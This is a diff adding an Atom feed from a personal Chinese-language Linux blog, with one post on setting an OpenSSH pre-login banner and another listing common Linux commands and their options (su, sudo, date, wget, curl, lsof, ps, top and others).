@@ -1,0 +1,4772 @@
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="https://sankgao.github.io/atom.xsl"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
+  <id>https://sankgao.github.io/</id>
+  <title>Sankgao Blog</title>
+  <subtitle>使用 VuePress-v2 搭建的个人博客</subtitle>
+  <icon>https://sankgao.github.io/favicon.ico</icon>
+  <rights>基于 MIT 协议，© 2023-至今 Sankgao</rights>
+  <updated>2023-04-14T02:02:34.340Z</updated>
+  <generator>vuepress-plugin-feed2</generator>
+  <link rel="self" href="https://sankgao.github.io/atom.xml"/>
+  <link rel="alternate" href="https://sankgao.github.io/"/>
+  <category term="Computer"/>
+  <entry>
+    <title type="text">使用 SSH 登录之前显示横幅消息</title>
+    <id>https://sankgao.github.io/computer/linux/banner_message.html</id>
+    <link href="https://sankgao.github.io/computer/linux/banner_message.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 使用 SSH 登录之前显示横幅消息</h2>
+<p><code>OpenSSH</code> 有一个名为 <code>Banner</code> 的内置选项。在允许身份验证之前，将指定文件的内容发送给远程用户。如果 <code>Banner</code> 选项设置为 <code>none</code>，那么在 ssh 登录时就不会显示任何 <code>Banner</code> 消息。默认情况下不显示横幅，并且禁用该选项。</p>
+<h2> 开启 Banner 选项</h2>
+<ol>
+<li>
+<p>打开 <code>/etc/ssh/sshd_config</code> 配置文件</p>
+<p>在配置文件末尾添加 <code>Banner /etc/ssh/my_banner</code> 这一行内容</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">vim</span> /etc/ssh/sshd_config
+
+或
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Banner /etc/ssh/my_banner"</span> <span class="token operator">&gt;&gt;</span> /etc/ssh/sshd_config
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>退出并保存配置文件</p>
+</li>
+<li>
+<p>创建 <code>/etc/ssh/my_banner</code> 文件</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">touch</span> /etc/ssh/my_banner
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+<li>
+<p>重启 sshd 服务</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>systemctl restart sshd
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+</ol>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 使用 SSH 登录之前显示横幅消息</h2>
+<p><code>OpenSSH</code> 有一个名为 <code>Banner</code> 的内置选项。在允许身份验证之前，将指定文件的内容发送给远程用户。如果 <code>Banner</code> 选项设置为 <code>none</code>，那么在 ssh 登录时就不会显示任何 <code>Banner</code> 消息。默认情况下不显示横幅，并且禁用该选项。</p>
+<h2> 开启 Banner 选项</h2>
+<ol>
+<li>
+<p>打开 <code>/etc/ssh/sshd_config</code> 配置文件</p>
+<p>在配置文件末尾添加 <code>Banner /etc/ssh/my_banner</code> 这一行内容</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>退出并保存配置文件</p>
+</li>
+<li>
+<p>创建 <code>/etc/ssh/my_banner</code> 文件</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+<li>
+<p>重启 sshd 服务</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+</ol>
+<h2> 设置 SSH 登录之前显示横幅消息</h2>
+<ol>
+<li>
+<p>设置横幅消息</p>
+<p>可以在网上搜索 <code>ASCII art</code>，会有许多生成 ascii 艺术字的网站。还可以将图片转换成 ASCII 类型的。或使用 figlet 命令生成普通字符的放大版。在 centos 中需要安装 epel 源，然后安装 figlet 程序。</p>
+<p><code>ASCII art</code> 网站：</p>
+<ul>
+<li>https://asciiart.website/</li>
+<li>http://1lineart.kulaone.com/#/</li>
+</ul>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>将 figlet 生成的艺术字体写入 <code>/etc/ssh/my_banner</code> 文件中</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+<li>
+<p>ssh 登录 linux 操作系统测试</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">Linux 系统常用命令</title>
+    <id>https://sankgao.github.io/computer/linux/command.html</id>
+    <link href="https://sankgao.github.io/computer/linux/command.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 系统常用命令</h2>
+<h3> man</h3>
+<p>man 用于查看命令的作用及选项信息，使用 <code>q</code> 退出，语法格式：<code>man 命令</code></p>
+<p>example：</p>
+<p><code>man echo</code></p>
+<h3> echo</h3>
+<p>echo 用于在终端上输出字符串或变量提取后的值，语法格式：<code>echo [字符串][$变量]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">使用转义符</td>
+</tr>
+</tbody>
+</table>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 系统常用命令</h2>
+<h3> man</h3>
+<p>man 用于查看命令的作用及选项信息，使用 <code>q</code> 退出，语法格式：<code>man 命令</code></p>
+<p>example：</p>
+<p><code>man echo</code></p>
+<h3> echo</h3>
+<p>echo 用于在终端上输出字符串或变量提取后的值，语法格式：<code>echo [字符串][$变量]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">使用转义符</td>
+</tr>
+</tbody>
+</table>
+<p>example:</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> su</h3>
+<p>su 用于切换用户账户，语法格式：<code>su [选项] 用户名</code></p>
+<blockquote>
+<p>从 root 用户切换到普通用户不需要输入密码，从普通用户切换到普通用户和 root 用户需要输入密码</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">- 或 -l</td>
+<td style="text-align:left">切换用户时重置环境变量</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">变更为帐号为 USER 的使用者并执行指令（command）后再变回原来使用者</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">不必读启动档（如 csh.cshrc 等），仅用于 csh 或 tcsh</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">指定要执行的 shell （bash csh tcsh 等），预设值为 /etc/passwd 内的该使用者（USER） shell</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> sudo</h3>
+<p>sudo 用于给普通用户提供额外的权限，语法格式：<code>sudo [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">列出当前用户可执行的命令</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">以指定用户执行命令</td>
+</tr>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:left">清空密码的有效时间，下次执行 sudo 时需要再次进行密码验证</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">在后台执行指定的命令</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">更改询问密码的提升语</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>sudo -l</code></p>
+<h3> date</h3>
+<p>date 用于显示或设置系统的时间与日期，语法格式：<code>date [+指定的格式]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">%F</td>
+<td style="text-align:left">显示年月日（example：2022-10-11）</td>
+</tr>
+<tr>
+<td style="text-align:center">%T</td>
+<td style="text-align:left">显示时分秒（example：19:26:26）</td>
+</tr>
+<tr>
+<td style="text-align:center">%S</td>
+<td style="text-align:left">秒（00-59）</td>
+</tr>
+<tr>
+<td style="text-align:center">%M</td>
+<td style="text-align:left">分钟（00-59）</td>
+</tr>
+<tr>
+<td style="text-align:center">%H</td>
+<td style="text-align:left">小时（00-23）</td>
+</tr>
+<tr>
+<td style="text-align:center">%l</td>
+<td style="text-align:left">小时（00-12）</td>
+</tr>
+<tr>
+<td style="text-align:center">%m</td>
+<td style="text-align:left">月份（1-12）</td>
+</tr>
+<tr>
+<td style="text-align:center">%p</td>
+<td style="text-align:left">显示出 AM 或 PM</td>
+</tr>
+<tr>
+<td style="text-align:center">%r</td>
+<td style="text-align:left">显示出 09:56:34 AM</td>
+</tr>
+<tr>
+<td style="text-align:center">%a</td>
+<td style="text-align:left">缩写的工作日名称（example：Sun）</td>
+</tr>
+<tr>
+<td style="text-align:center">%A</td>
+<td style="text-align:left">完整的工作日名称（example：Sunday）</td>
+</tr>
+<tr>
+<td style="text-align:center">%b</td>
+<td style="text-align:left">缩写的月份名称（example：Jan）</td>
+</tr>
+<tr>
+<td style="text-align:center">%B</td>
+<td style="text-align:left">完整的月份名称（example：January）</td>
+</tr>
+<tr>
+<td style="text-align:center">%q</td>
+<td style="text-align:left">季度（1-4）</td>
+</tr>
+<tr>
+<td style="text-align:center">%y</td>
+<td style="text-align:left">简写年份（example：22）</td>
+</tr>
+<tr>
+<td style="text-align:center">%Y</td>
+<td style="text-align:left">完整年份（example：2022）</td>
+</tr>
+<tr>
+<td style="text-align:center">%d</td>
+<td style="text-align:left">本月中的第几天</td>
+</tr>
+<tr>
+<td style="text-align:center">%j</td>
+<td style="text-align:left">本年中的第几天</td>
+</tr>
+<tr>
+<td style="text-align:center">%w</td>
+<td style="text-align:left">一个星期的第几天（0代表星期天）</td>
+</tr>
+<tr>
+<td style="text-align:center">%W</td>
+<td style="text-align:left">一年的第几个星期（00~53，星期一为第一天）</td>
+</tr>
+<tr>
+<td style="text-align:center">%n</td>
+<td style="text-align:left">换行符（相当于回车键）</td>
+</tr>
+<tr>
+<td style="text-align:center">%t</td>
+<td style="text-align:left">跳格（相当于 Tab 键）</td>
+</tr>
+</tbody>
+</table>
+<p>example:</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> timedatectl</h3>
+<p>timedatectl 用于查看设置系统的时区，语法格式：<code>timedatectl [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">status</td>
+<td style="text-align:left">显示状态信息</td>
+</tr>
+<tr>
+<td style="text-align:center">list-timezones</td>
+<td style="text-align:left">列出已知时区</td>
+</tr>
+<tr>
+<td style="text-align:center">set-time</td>
+<td style="text-align:left">设置系统时间</td>
+</tr>
+<tr>
+<td style="text-align:center">set-timezone</td>
+<td style="text-align:left">设置生效时区</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> reboot</h3>
+<p>reboot 用于重启系统</p>
+<h3> poweroff</h3>
+<p>poweroff 用于关闭系统</p>
+<h3> wget</h3>
+<p>wget 用于在终端命令行上下载网络文件，无需打开浏览器，语法格式：<code>wget [选项] 网址</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">后台下载模式</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">下载到指定目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">最大尝试次数。值为 0 时将强制不断进行尝试</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">断点续传</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">下载页面内所有资源，包括图片、视频等</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">递归下载</td>
+</tr>
+<tr>
+<td style="text-align:center">-O</td>
+<td style="text-align:left">指定文件名</td>
+</tr>
+<tr>
+<td style="text-align:center">-o</td>
+<td style="text-align:left">将输出的内容保存到指定文件中</td>
+</tr>
+<tr>
+<td style="text-align:center">-nc</td>
+<td style="text-align:left">文件存在时，下载文件不覆盖原有文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-mc</td>
+<td style="text-align:left">下载时只显示更新和出错信息，不显示指令的详细执行过程</td>
+</tr>
+<tr>
+<td style="text-align:center">--no-check-certificate</td>
+<td style="text-align:left">下载 https 网站资源时可能需要使用该选项跳过证书检测的过程</td>
+</tr>
+<tr>
+<td style="text-align:center">--limit-rate</td>
+<td style="text-align:left">限制下载指定带宽。可以用 k（千字节）和 m（兆字节）指定速度限制</td>
+</tr>
+<tr>
+<td style="text-align:center">--user</td>
+<td style="text-align:left">网站需要认证时，指定用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">--password</td>
+<td style="text-align:left">网站需要认证时，指定密码</td>
+</tr>
+<tr>
+<td style="text-align:center">--ask-password</td>
+<td style="text-align:left">网站需要认证时，在网页中输入密码</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> curl</h3>
+<p>curl 命令的用途广泛，其功能包括下载、发送各种 HTTP 请求以及指定 HTTP 头部，语法格式：<code>curl  [选项] 网址</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-C -</td>
+<td style="text-align:left">推断出正确的续传位置。不需要指定准确的字节偏移使用 -C</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">以 POST 方式提交用户数据。-d 的字符串参数形式类似于 GET 请求。每对 var=value 之间用 &amp; 分隔</td>
+</tr>
+<tr>
+<td style="text-align:center">-O</td>
+<td style="text-align:left">指明将下载数据写入文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-o</td>
+<td style="text-align:left">指定输出文件名</td>
+</tr>
+<tr>
+<td style="text-align:center">-u username:password</td>
+<td style="text-align:left">完成 HTTP 或 FTP 认证，指定用户名和密码。如果想要提示后再输入密码，则不加 password</td>
+</tr>
+<tr>
+<td style="text-align:center">-I 或 --head</td>
+<td style="text-align:left">只打印 HTTP 头部信息，无须下载远程文件</td>
+</tr>
+<tr>
+<td style="text-align:center">--silent</td>
+<td style="text-align:left">不显示进度信息</td>
+</tr>
+<tr>
+<td style="text-align:center">--progress</td>
+<td style="text-align:left">显示形如 # 的进度条</td>
+</tr>
+<tr>
+<td style="text-align:center">--referer</td>
+<td style="text-align:left">指定参照页字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">--cookie</td>
+<td style="text-align:left">指定提供哪些 cookie，多个 cookie 之间用 ; 号分隔</td>
+</tr>
+<tr>
+<td style="text-align:center">--cookie-jar</td>
+<td style="text-align:left">将 cookie 另存为文件</td>
+</tr>
+<tr>
+<td style="text-align:center">--limit-rate</td>
+<td style="text-align:left">限制下载指定带宽。可以用 k（千字节）和 m（兆字节）指定速度限制</td>
+</tr>
+<tr>
+<td style="text-align:center">--max-filesize</td>
+<td style="text-align:left">指定可下载的最大文件大小</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> lsof</h3>
+<p>lsof 用于查看你进程开打的文件，打开文件的进程，进程打开的端口（TCP、UDP），语法格式：<code>lsof [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">列出打开文件存在的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">-c&lt;进程名&gt;</td>
+<td style="text-align:left">列出指定进程所打开的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-g</td>
+<td style="text-align:left">列出 GID 号进程详情</td>
+</tr>
+<tr>
+<td style="text-align:center">-d&lt;文件号&gt;</td>
+<td style="text-align:left">列出占用该文件号的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">+d&lt;目录&gt;</td>
+<td style="text-align:left">列出目录下被打开的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">+D&lt;目录&gt;</td>
+<td style="text-align:left">递归列出目录下被打开的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-n&lt;目录&gt;</td>
+<td style="text-align:left">列出使用 NFS 的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-i&lt;条件&gt;</td>
+<td style="text-align:left">列出符合条件的进程。（4、6、协议、:端口、 @ip）</td>
+</tr>
+<tr>
+<td style="text-align:center">-p&lt;进程号&gt;</td>
+<td style="text-align:left">列出指定进程号所打开的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">列出 UID 号进程详情</td>
+</tr>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">列出父进程标识符</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">显示帮助信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示版本信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>各个列表的含义：</p>
+<ul>
+<li>COMMAND：进程的名称</li>
+<li>PID：进程标识符</li>
+<li>USER：进程所有者</li>
+<li>PGID：进程所属组</li>
+<li>FD：文件描述符，应用程序通过文件描述符识别该文件</li>
+<li>TYPE：是与文件关联的节点类型，例如：GDIR、GREG、VDIR、VREG 等。</li>
+<li>DEVICE：指定磁盘的名称</li>
+<li>SIZE：文件的大小</li>
+<li>NODE：索引节点（文件在磁盘上的标识）</li>
+<li>NAME：打开文件的确切名称</li>
+</ul>
+<h3> ps</h3>
+<p>ps 用于查看系统中的进程状态，语法格式：<code>ps [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有进程（包括其他用户的进程）</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">用户以及其他详细信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">显示当前用户在所有终端下的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">显示系统内的所有进程信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">使用长（long）格式显示进程信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">使用完整的（full）格式显示进程信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-T</td>
+<td style="text-align:left">查看进程下面的子线程</td>
+</tr>
+</tbody>
+</table>
+<p>Linux 系统常见的进程状态：</p>
+<p><strong>R（运行）</strong>：进程正在运行或在运行队列中等待
+<strong>S（中断）</strong>：进程处于休眠中，当某个条件形成后或者接收到信号时，则脱离该状态
+<strong>D（不可中断）</strong>：进程不响应系统异步信号，即便用 kill 命令也不能将其中断
+<strong>Z（僵死）</strong>：进程已经终止，但进程描述符依然存在，直到父进程调用 wait4() 系统函数后将进程释放
+<strong>T（停止）</strong>：进程收到停止信号后停止运行</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>各个列表的含义：</p>
+<ul>
+<li><code>USER</code>：进程的属主</li>
+<li><code>PID</code>：进程的 PID</li>
+<li><code>%CPU</code>：进程占用的 CPU 百分比</li>
+<li><code>%MEM</code>：占用内存的百分比</li>
+<li><code>VSZ</code>：进程使用的虚拟內存量（KB）</li>
+<li><code>RSS</code>：该进程占用的固定內存量（KB）（驻留中页的数量）</li>
+<li><code>TTY</code>：该进程在哪个终端上运行（登陆者的终端位置），若与终端无关，则显示（？）。若为 pts/0 等，则表示由网络连接主机进程</li>
+<li><code>STAT</code>：状态位常见的状态字符
+<ul>
+<li><code>D</code>：无法中断的休眠状态（通常 IO 的进程）</li>
+<li><code>R</code>：正在运行可中在队列中可过行的</li>
+<li><code>S</code>：处于休眠状态</li>
+<li><code>T</code>：停止或被追踪</li>
+<li><code>W</code>：进入内存交换 （从内核2.6开始无效）</li>
+<li><code>X</code>：死掉的进程 （基本很少見）</li>
+<li><code>Z</code>：僵尸进程</li>
+<li><code>&lt;</code>：优先级高的进程</li>
+<li><code>N</code>：优先级较低的进程</li>
+<li><code>L</code>：有些页被锁进内存</li>
+<li><code>s</code>：进程的领导者（在它之下有子进程）</li>
+<li><code>l</code>：多进程的（使用 CLONE_THREAD, 类似 NPTL pthreads）</li>
+<li><code>+</code>：位于前台的进程组</li>
+</ul>
+</li>
+<li><code>START</code>：该进程被触发启动时间</li>
+<li><code>TIME</code>：该进程实际使用 CPU 运行时间</li>
+<li><code>COMMAND</code>：命令的名称和参</li>
+</ul>
+<h3> pstree</h3>
+<p>pstree 用于以树状图的形式展示进程之间的关系</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-A</td>
+<td style="text-align:left">各进程树之间的连接以 ASCII 码字符来连接</td>
+</tr>
+<tr>
+<td style="text-align:center">-U</td>
+<td style="text-align:left">各进程树之间的连接以 utf8 字符来连接，某些终端可能会有错误</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">同时列出每个进程的 PID</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">同时列出每个进程的所属账号名称</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> top</h3>
+<p>top 用于动态地监视进程活动及系统负载等信息，语法格式：<code>top | top [-d number] | top [-bn 3 -p 1712]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">number 表示页面更新的间隔秒数，默认是 5 秒</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">以批次的方式执行 top</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">与 -b 配合使用，表示输出的 top 结果次数</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">指定特定的 pid 进程号</td>
+</tr>
+</tbody>
+</table>
+<p>top 命令显示的页面还可以输入以下按键执行相应的功能（注意大小写区分的）：</p>
+<ul>
+<li>?：在 top 当中可以输入的命令</li>
+<li>d：指定 top 页面的刷新间隔</li>
+<li>P：以 CPU 的使用资源排序显示</li>
+<li>M：以内存的使用资源排序显示</li>
+<li>N：以 pid 排序显示</li>
+<li>T：由进程使用的时间累计排序显示</li>
+<li>k：给某一个 pid 一个信号。可以用来杀死进程</li>
+<li>r：给某个 pid 重新定制一个 nice 值（即优先级）</li>
+<li>q：退出 top（用 ctrl+c 也可以退出 top）</li>
+</ul>
+<p>top 前 5 行统计信息：</p>
+<p><strong>第一行</strong>：top - 10:33:20 up 3 days, 17:19,  1 user,  load average: 0.00, 0.00, 0.00</p>
+<ul>
+<li>10:33:20：系统时间</li>
+<li>up 3 days：运行时间</li>
+<li>1 user：登录终端数</li>
+<li>load average: 0.00, 0.00, 0.00：系统负载（三个值分别为 1 分钟、5 分钟、15 分钟内的平均值，数值越小负载越低）</li>
+</ul>
+<blockquote>
+<p>load average: 如果这个数除以逻辑 CPU 的数量，结果高于 5 的时候就表明系统在超负荷运转了</p>
+</blockquote>
+<p><strong>第二行</strong>：Tasks: 162 total,   1 running, 161 sleeping,   0 stopped,   0 zombie</p>
+<ul>
+<li>162 total：进程总数</li>
+<li>1 running：运行中的进程数</li>
+<li>161 sleeping：睡眠中的进程数</li>
+<li>0 stopped：停止的进程数</li>
+<li>0 zombie：僵死的进程数</li>
+</ul>
+<p><strong>第三行</strong>：%Cpu(s):  0.2 us,  0.0 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.2 hi,  0.0 si,  0.0 st</p>
+<ul>
+<li>0.2 us：用户空间占用 CPU 百分比</li>
+<li>0.0 sy：内核空间占用 CPU 百分比</li>
+<li>0.0 ni：用户进程空间内改变过优先级的进程占用 CPU 百分比</li>
+<li>99.7 id：空闲 CPU 百分比</li>
+<li>0.0 wa：等待输入输出的 CPU 时间百分比</li>
+<li>0.2 hi：硬中断（Hardware IRQ）占用 CPU 的百分比</li>
+<li>0.0 si：软中断（Software Interrupts）占用 CPU 的百分比</li>
+<li>0.0 st：用于有虚拟 CPU 的情况，用来指示被虚拟机偷掉的 CPU 时间</li>
+</ul>
+<p><strong>第四行</strong>：MiB Mem :   1785.3 total,    684.9 free,    309.6 used,    790.9 buff/cache</p>
+<ul>
+<li>1785.3 total：物理内存总量</li>
+<li>684.9 free：空闲内存总量</li>
+<li>309.6 used：使用的物理内存总量</li>
+<li>790.9 buff/cache：作为内核缓存的内存量</li>
+</ul>
+<p><strong>第五行</strong>：MiB Swap:   2076.0 total,   2076.0 free,      0.0 used.   1276.2 avail Mem</p>
+<ul>
+<li>2076.0 total：交换区总量</li>
+<li>2076.0 free：空闲交换区总量</li>
+<li>0.0 used：使用的交换区总量</li>
+<li>1276.2 avail Mem：可用于进程下一次分配的物理内存数量</li>
+</ul>
+<blockquote>
+<p>缓冲的交换区总量：所谓缓冲的交换区总量，即内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，该数值即为这些内容已存在于内存中的交换区的大小。相应的内存再次被换出时可不必再对交换区写入。</p>
+</blockquote>
+<p>进程信息：</p>
+<ul>
+<li>PID：进程 PID</li>
+<li>PPID：父进程 PID</li>
+<li>RUSER：真实用户名</li>
+<li>UID：进程所有者的用户 UID</li>
+<li>USER：进程所有者的用户名</li>
+<li>GROUP：进程所有者的组名</li>
+<li>TTY：启动进程的终端名。</li>
+<li>PR：优先级</li>
+<li>NI：nice 值。负值表示高优先级，正值表示低优先级</li>
+<li>P：最后使用的 CPU，仅在多 CPU 环境下有意义</li>
+<li>%CPU：上次更新到现在的 CPU 时间占用百分比</li>
+<li>TIME：进程使用的 CPU 时间总计，单位秒</li>
